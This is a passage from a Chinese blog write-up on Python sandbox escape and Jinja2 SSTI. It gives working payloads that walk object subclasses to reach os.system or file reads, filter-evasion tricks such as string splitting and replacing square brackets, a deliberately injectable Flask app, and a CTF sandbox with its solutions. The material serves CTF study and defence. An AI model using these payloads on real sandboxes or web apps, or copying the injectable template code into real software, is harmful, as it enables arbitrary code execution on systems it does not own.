<h4 id="reload-方法"><a href="#reload-方法" class="headerlink" title="reload()方法"></a>reload()方法</h4><h5 id="某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload-函数重新加载该模块，从而可以调用删除掉的可利用的方法："><a href="#某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload-函数重新加载该模块，从而可以调用删除掉的可利用的方法：" class="headerlink" title="某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload()函数重新加载该模块，从而可以调用删除掉的可利用的方法："></a>某些情况下，通过del将一些模块的某些方法给删除掉了，但是我们可以通过reload()函数重新加载该模块，从而可以调用删除掉的可利用的方法：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&apos;eval&apos;]</span><br><span class="line">&lt;built-in function eval&gt;</span><br><span class="line">&gt;&gt;&gt; del __builtins__.__dict__[&apos;eval&apos;]</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&apos;eval&apos;]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">KeyError: &apos;eval&apos;</span><br><span class="line">&gt;&gt;&gt; reload(__builtins__)</span><br><span class="line">&lt;module &apos;__builtin__&apos; (built-in)&gt;</span><br><span class="line">&gt;&gt;&gt; __builtins__.__dict__[&apos;eval&apos;]</span><br><span class="line">&lt;built-in function eval&gt;</span><br></pre></td></tr></table></figure>

<h4 id="字符串拼接"><a href="#字符串拼接" class="headerlink" title="字符串拼接"></a>字符串拼接</h4><h5 id="凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。"><a href="#凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。" class="headerlink" title="凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。"></a>凡是以字符串形式作为参数的都可以使用拼接的形式来绕过特定关键字的检测。</h5><h5 id="如：-2"><a href="#如：-2" class="headerlink" title="如："></a>如：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__bu&apos;+&apos;iltins__&apos;][&apos;__impor&apos;+&apos;t__&apos;](&apos;o&apos;+&apos;s&apos;).system(&apos;ca&apos;+&apos;lc&apos;)</span><br></pre></td></tr></table></figure>

<h4 id="过滤中括号"><a href="#过滤中括号" class="headerlink" title="过滤中括号"></a>过滤中括号</h4><h5 id="当中括号-被过滤掉时，"><a href="#当中括号-被过滤掉时，" class="headerlink" title="当中括号[]被过滤掉时，"></a>当中括号[]被过滤掉时，</h5><h5 id="调用-getitem-函数直接替换；"><a href="#调用-getitem-函数直接替换；" class="headerlink" title="调用__getitem__()函数直接替换；"></a>调用__getitem__()函数直接替换；</h5><h5 id="调用pop-函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；"><a href="#调用pop-函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；" class="headerlink" title="调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；"></a>调用pop()函数（用于移除列表中的一个元素，默认最后一个元素，并且返回该元素的值）替换；</h5><h5 id="如：-3"><a href="#如：-3" class="headerlink" title="如："></a>如：</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 原型</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># __getitem__()替换中括号[]</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().__getitem__(<span class="number">59</span>).__init__.__globals__.__getitem__(<span class="string">'__builtins__'</span>).__getitem__(<span class="string">'__import__'</span>)(<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()替换中括号[]，结合__getitem__()利用</span></span><br><span class="line"><span class="string">''</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">59</span>).__init__.__globals__.pop(<span class="string">'__builtins__'</span>).pop(<span class="string">'__import__'</span>)(<span class="string">'os'</span>).system(<span class="string">'calc'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="0x05-ssti注入"><a href="#0x05-ssti注入" class="headerlink" title="0x05 ssti注入"></a>0x05 ssti注入</h4><h4 id="题目环境搭建如下："><a href="#题目环境搭建如下：" class="headerlink" title="题目环境搭建如下："></a>题目环境搭建如下：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">from flask import Flask, request</span><br><span class="line">from jinja2 import Template</span><br><span class="line">from flask import render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&apos;SECRET_KEY&apos;] = &quot;flag&#123;ljdd520&#125;&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    t=Template(&quot;Hello world!&quot;)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/ssti&quot;)</span><br><span class="line">def ssti():</span><br><span class="line">    name = request.args.get(&apos;name&apos;, &apos;guest&apos;)</span><br><span class="line"></span><br><span class="line">    t = Template(&quot;Hello &quot; + name)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/demo&apos;)</span><br><span class="line">def demo():</span><br><span class="line">    t=Template(&apos;&#123;% for i in range(10) %&#125;&#123;&#123; i &#125;&#125;&#123;% endfor %&#125;&apos;)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/safe&apos;)</span><br><span class="line">def safe():</span><br><span class="line">    name=request.args.get(&apos;name&apos;,&apos;guest&apos;)</span><br><span class="line">    t=Template(&quot;Hello &#123;&#123;n&#125;&#125;&quot;)</span><br><span class="line">    return t.render(n=name)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/runos&apos;)</span><br><span class="line">def runos():</span><br><span class="line">    name = request.args.get(&apos;name&apos;)</span><br><span class="line">    template = &apos;&lt;h1&gt;hello &#123;&#125;!&lt;h1&gt;&apos;.format(name)</span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    # app.run(debug=True,host=&quot;0.0.0.0&quot;,port=8080)</span><br><span class="line">    app.run(debug=True,host=&quot;127.0.0.1&quot;,port=8080)</span><br></pre></td></tr></table></figure>

<h4 id="分析太多了，由于没有过滤随便搞。"><a href="#分析太多了，由于没有过滤随便搞。" class="headerlink" title="分析太多了，由于没有过滤随便搞。"></a>分析太多了，由于没有过滤随便搞。</h4><h4 id="一道金典的ctf题目"><a href="#一道金典的ctf题目" class="headerlink" title="一道金典的ctf题目"></a>一道金典的ctf题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_secure</span><span class="params">()</span>:</span></span><br><span class="line">    UNSAFE = [</span><br><span class="line">        <span class="string">'open'</span>,</span><br><span class="line">        <span class="string">'file'</span>,</span><br><span class="line">        <span class="string">'execfile'</span>,</span><br><span class="line">        <span class="string">'compile'</span>,</span><br><span class="line">        <span class="string">'reload'</span>,</span><br><span class="line">        <span class="string">'__import__'</span>,</span><br><span class="line">        <span class="string">'eval'</span>,</span><br><span class="line">        <span class="string">'input'</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> func <span class="keyword">in</span> UNSAFE:</span><br><span class="line">        <span class="keyword">del</span> __builtins__.__dict__[func]</span><br><span class="line"><span class="keyword">from</span> re <span class="keyword">import</span> findall</span><br><span class="line"><span class="comment"># Remove dangerous builtins</span></span><br><span class="line">make_secure()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Go Ahead, Expoit me &gt;;D'</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        inp=raw_input().strip()</span><br><span class="line">        a = <span class="literal">None</span></span><br><span class="line">        <span class="comment"># Set a to the result from executing the user input</span></span><br><span class="line">        <span class="keyword">exec</span> <span class="string">'a='</span> + inp</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Return Value:'</span>, a</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Exception:'</span>, e</span><br></pre></td></tr></table></figure>

<h5 id="这道题目运行在python2-7的环境，在删除-import-等危险函数的同时也删除了-reload。"><a href="#这道题目运行在python2-7的环境，在删除-import-等危险函数的同时也删除了-reload。" class="headerlink" title="这道题目运行在python2.7的环境，在删除__import__等危险函数的同时也删除了 reload。"></a>这道题目运行在python2.7的环境，在删除__import__等危险函数的同时也删除了 reload。</h5><h5 id="可以用如下的payload绕过："><a href="#可以用如下的payload绕过：" class="headerlink" title="可以用如下的payload绕过："></a>可以用如下的payload绕过：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[40](&quot;./flag&quot;).read()</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&quot;./flag&quot;).read()</span><br></pre></td></tr></table></figure>

<h5 id="这是另一个payload："><a href="#这是另一个payload：" class="headerlink" title="这是另一个payload："></a>这是另一个payload：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)</span><br></pre></td></tr></table></figure>

<h5 id="前一部分思路类似于读文件，就来到这。"><a href="#前一部分思路类似于读文件，就来到这。" class="headerlink" title="前一部分思路类似于读文件，就来到这。"></a>前一部分思路类似于读文件，就来到这。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59]</span><br><span class="line">&lt;class &apos;warnings.WarningMessage&apos;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="可以看到是获取了一个warnings-WarningMessage类，然后继续执行-init-后获取全局变量"><a href="#可以看到是获取了一个warnings-WarningMessage类，然后继续执行-init-后获取全局变量" class="headerlink" title="可以看到是获取了一个warnings.WarningMessage类，然后继续执行__init__后获取全局变量"></a>可以看到是获取了一个warnings.WarningMessage类，然后继续执行__init__后获取全局变量</h5><h5 id="func-globals返回一个包含函数全局变量的字典引用"><a href="#func-globals返回一个包含函数全局变量的字典引用" class="headerlink" title="func_globals返回一个包含函数全局变量的字典引用"></a><code>func_globals返回一个包含函数全局变量的字典引用</code></h5><h5 id="然后获取linecache模块（其中包含了os模块）"><a href="#然后获取linecache模块（其中包含了os模块）" class="headerlink" title="然后获取linecache模块（其中包含了os模块）"></a>然后获取linecache模块（其中包含了os模块）</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;]</span><br><span class="line">&lt;module &apos;linecache&apos; from &apos;D:\python\lib\linecache.pyc&apos;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="然后用-dict-获取指定模块（由于对输入的字符进行了限制，所以要找个利用字符串获取指定模块的方式）"><a href="#然后用-dict-获取指定模块（由于对输入的字符进行了限制，所以要找个利用字符串获取指定模块的方式）" class="headerlink" title="然后用__dict__获取指定模块（由于对输入的字符进行了限制，所以要找个利用字符串获取指定模块的方式）"></a>然后用__dict__获取指定模块（由于对输入的字符进行了限制，所以要找个利用字符串获取指定模块的方式）</h5><h5 id="dict-是一个字典，键为属性名，值为属性值"><a href="#dict-是一个字典，键为属性名，值为属性值" class="headerlink" title="__dict__是一个字典，键为属性名，值为属性值"></a><code>__dict__是一个字典，键为属性名，值为属性值</code></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;os&apos;]</span><br><span class="line">&lt;module &apos;os&apos; from &apos;D:\python\lib\os.pyc&apos;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="直接逃逸就好了："><a href="#直接逃逸就好了：" class="headerlink" title="直接逃逸就好了："></a>直接逃逸就好了：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;sy&apos;+&apos;stem&apos;](&apos;ls&apos;)</span><br></pre></td></tr></table></figure>

<h4 id="0x06-绕过再分析"><a href="#0x06-绕过再分析" class="headerlink" title="0x06 绕过再分析"></a>0x06 绕过再分析</h4><h4 id="利用继承链绕过沙盒。"><a href="#利用继承链绕过沙盒。" class="headerlink" title="利用继承链绕过沙盒。"></a>利用继承链绕过沙盒。</h4><h5 id="利用file对象读取文件"><a href="#利用file对象读取文件" class="headerlink" title="利用file对象读取文件"></a>利用file对象读取文件</h5><h5 id="构造继承链的一种思路是："><a href="#构造继承链的一种思路是：" class="headerlink" title="构造继承链的一种思路是："></a>构造继承链的一种思路是：</h5><h5 id="1-随便找到一个内置类对象用-class-拿到他所对应的类"><a href="#1-随便找到一个内置类对象用-class-拿到他所对应的类" class="headerlink" title="1.随便找到一个内置类对象用__class__拿到他所对应的类"></a>1.随便找到一个内置类对象用__class__拿到他所对应的类</h5><h5 id="2-用-bases-拿到基类-lt-class-‘object-39"><a href="#2-用-bases-拿到基类-lt-class-‘object-39" class="headerlink" title="2.用__bases__拿到基类(&lt;class ‘object&#39;)"></a>2.用__bases__拿到基类(&lt;class ‘object&#39;)</h5><h5 id="3-用-subclasses-拿到子类列表"><a href="#3-用-subclasses-拿到子类列表" class="headerlink" title="3.用__subclasses__()拿到子类列表"></a>3.用__subclasses__()拿到子类列表</h5><h5 id="4-在子类列表中直接寻找可以利用的类"><a href="#4-在子类列表中直接寻找可以利用的类" class="headerlink" title="4.在子类列表中直接寻找可以利用的类"></a>4.在子类列表中直接寻找可以利用的类</h5><h4 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br></pre></td></tr></table></figure>

<h4 id="可以看到："><a href="#可以看到：" class="headerlink" title="可以看到："></a>可以看到：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[...,&lt;type &apos;file&apos;&gt;, ...]</span><br></pre></td></tr></table></figure>

<h4 id="寻找file的位置。"><a href="#寻找file的位置。" class="headerlink" title="寻找file的位置。"></a>寻找<code>file</code>的位置。</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'file'</span></span><br><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">in</span> str(i):</span><br><span class="line">        <span class="keyword">print</span> num</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h4 id="用dir来看看内置的方法"><a href="#用dir来看看内置的方法" class="headerlink" title="用dir来看看内置的方法"></a>用<code>dir</code>来看看内置的方法</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>])</span><br></pre></td></tr></table></figure>

<h4 id="运行的结果如下："><a href="#运行的结果如下：" class="headerlink" title="运行的结果如下："></a>运行的结果如下：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__class__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__enter__'</span>, <span class="string">'__exit__'</span>, <span class="string">'__format__'</span>, <span class="string">'__getattribute__'</span>, <span class="string">'__hash__'</span>, <span class="string">'__init__'</span>, <span class="string">'__iter__'</span>, <span class="string">'__new__'</span>, <span class="string">'__reduce__'</span>, <span class="string">'__reduce_ex__'</span>, <span class="string">'__repr__'</span>, <span class="string">'__setattr__'</span>, <span class="string">'__sizeof__'</span>, <span class="string">'__str__'</span>, <span class="string">'__subclasshook__'</span>, <span class="string">'close'</span>, <span class="string">'closed'</span>, <span class="string">'encoding'</span>, <span class="string">'errors'</span>, <span class="string">'fileno'</span>, <span class="string">'flush'</span>, <span class="string">'isatty'</span>, <span class="string">'mode'</span>, <span class="string">'name'</span>, <span class="string">'newlines'</span>, <span class="string">'next'</span>, <span class="string">'read'</span>, <span class="string">'readinto'</span>, <span class="string">'readline'</span>, <span class="string">'readlines'</span>, <span class="string">'seek'</span>, <span class="string">'softspace'</span>, <span class="string">'tell'</span>, <span class="string">'truncate'</span>, <span class="string">'write'</span>, <span class="string">'writelines'</span>, <span class="string">'xreadlines'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="构造payload如下："><a href="#构造payload如下：" class="headerlink" title="构造payload如下："></a>构造payload如下：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'filename'</span>).readlines()</span><br></pre></td></tr></table></figure>

<h4 id="或者用-mro-构造如下："><a href="#或者用-mro-构造如下：" class="headerlink" title="或者用__mro__构造如下："></a>或者用<code>__mro__</code>构造如下：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'filename'</span>).readlines()</span><br></pre></td></tr></table></figure>

<h4 id="方法等价于"><a href="#方法等价于" class="headerlink" title="方法等价于"></a>方法等价于</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file(&apos;./flag&apos;).readlines()</span><br></pre></td></tr></table></figure>

<h4 id="用类置模块执行命令"><a href="#用类置模块执行命令" class="headerlink" title="用类置模块执行命令"></a>用类置模块执行命令</h4><h5 id="可以用-globals-更深入的去看每个类可以调用的东西（包括模块，类，变量等等）。"><a href="#可以用-globals-更深入的去看每个类可以调用的东西（包括模块，类，变量等等）。" class="headerlink" title="可以用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等）。"></a>可以用__globals__更深入的去看每个类可以调用的东西（包括模块，类，变量等等）。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'os'</span>   <span class="comment">#也可以是其他你想利用的模块</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span> </span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 72)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 74)</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h4 id="如下的payload："><a href="#如下的payload：" class="headerlink" title="如下的payload："></a>如下的payload：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__mro__[1].__subclasses__()[77].__init__.__globals__[&apos;os&apos;].system(&apos;whoami&apos;)</span><br><span class="line">().__class__.__mro__[1].__subclasses__()[72].__init__.__globals__[&apos;os&apos;].system(&apos;whoami&apos;)</span><br></pre></td></tr></table></figure>

<h4 id="上面的方法是基于python2的。"><a href="#上面的方法是基于python2的。" class="headerlink" title="上面的方法是基于python2的。"></a>上面的方法是基于python2的。</h4><h4 id="下面是py2和py3都通用的。"><a href="#下面是py2和py3都通用的。" class="headerlink" title="下面是py2和py3都通用的。"></a>下面是py2和py3都通用的。</h4><h5 id="我们要用-builtins-来构造。"><a href="#我们要用-builtins-来构造。" class="headerlink" title="我们要用__builtins__来构造。"></a>我们要用__builtins__来构造。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line">search = <span class="string">'__builtins__'</span></span><br><span class="line">num = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__():</span><br><span class="line">    num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> search <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            print(i, num)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">(&lt;class 'warnings.WarningMessage'&gt;, 59)</span></span><br><span class="line"><span class="string">(&lt;class 'warnings.catch_warnings'&gt;, 60)</span></span><br><span class="line"><span class="string">(&lt;class '_weakrefset._IterationGuard'&gt;, 61)</span></span><br><span class="line"><span class="string">(&lt;class '_weakrefset.WeakSet'&gt;, 62)</span></span><br><span class="line"><span class="string">(&lt;class 'site._Printer'&gt;, 72)</span></span><br><span class="line"><span class="string">(&lt;class 'site.Quitter'&gt;, 74)</span></span><br><span class="line"><span class="string">(&lt;class 'codecs.IncrementalEncoder'&gt;, 75)</span></span><br><span class="line"><span class="string">(&lt;class 'codecs.IncrementalDecoder'&gt;, 76)</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure>

<h4 id="于是有py3："><a href="#于是有py3：" class="headerlink" title="于是有py3："></a>于是有py3：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="py2："><a href="#py2：" class="headerlink" title="py2："></a>py2：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).system(&apos;whoami&apos;)&quot;)</span><br></pre></td></tr></table></figure>

<h4 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h4><h6 id="Python沙箱逃逸总结"><a href="#Python沙箱逃逸总结" class="headerlink" title="Python沙箱逃逸总结"></a><a href="https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">Python沙箱逃逸总结</a></h6><h6 id="Python-沙箱逃逸"><a href="#Python-沙箱逃逸" class="headerlink" title="Python 沙箱逃逸"></a><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/sandbox/python-sandbox-escape/" target="_blank" rel="noopener">Python 沙箱逃逸</a></h6><h6 id="python-沙箱逃逸"><a href="#python-沙箱逃逸" class="headerlink" title="python 沙箱逃逸"></a><a href="https://98587329.github.io/2018/06/06/python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" target="_blank" rel="noopener">python 沙箱逃逸</a></h6>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/10/06/CSP的知识总结和绕过/" rel="next" title="CSP的知识总结和绕过">
                <i class="fa fa-chevron-left"></i> CSP的知识总结和绕过
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/10/09/2019年护网杯web之esaypy复现/" rel="prev" title="2019年护网杯web之esaypy复现">
                2019年护网杯web之esaypy复现 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

